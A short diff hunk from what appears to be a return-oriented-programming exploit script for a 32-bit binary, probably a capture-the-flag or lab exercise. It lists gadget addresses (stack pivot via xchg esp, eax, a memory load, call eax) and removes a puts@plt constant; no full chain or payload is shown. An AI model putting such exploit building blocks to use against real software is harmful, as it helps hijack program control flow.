@@ -19,9 +19,6 @@ xchg_esp_eax_ret = b'\x2e\x88\x04\x08'
 # 0x08048830 mov eax, DWORD PTR [eax] ; ret
 mov_eax_dword_ptr_eax = b'\x30\x88\x04\x08'
 
-# 0x08048500  puts@plt
-puts_plt = b'\x00\x85\x04\x08'
-
 # 0x080485f0 : call eax
 call_eax = b'\xf0\x85\x04\x08'
 
